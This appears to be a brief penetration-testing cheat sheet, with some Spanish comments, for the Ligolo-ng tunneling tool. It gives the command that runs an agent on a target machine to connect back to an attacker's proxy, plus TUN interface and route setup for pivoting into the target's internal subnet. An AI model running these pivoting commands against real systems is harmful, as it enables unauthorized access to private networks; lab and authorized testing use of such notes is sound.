## Ligolo-ng
https://github.com/nicocha30/ligolo-ng/releases/tag/v0.9.2
- agent (target)
- proxy (attack)

```bash
# run it target machine
./agent -connect <IP_TUN>:11601 -ignore-cert
# run it attacker machine
sudo ./proxy -laddr 0.0.0.0:11601 -selfcert
```

```bash
# 1. Create the TUN interface
sudo ip tuntap add user $USER mode tun dev ligolo
# 2. Bring up the network interface
sudo ip link set dev ligolo up
# 3. Add the route to the target internal subnet
sudo ip route add <SUBRED_TARGET>/24 dev ligolo
sudo ip route add 10.13.37.0/24 dev ligolo
# Opcional, solo cuando sale RTNETLINK answers: File exists
sudo ip route del 10.13.37.0/24 dev tun0
```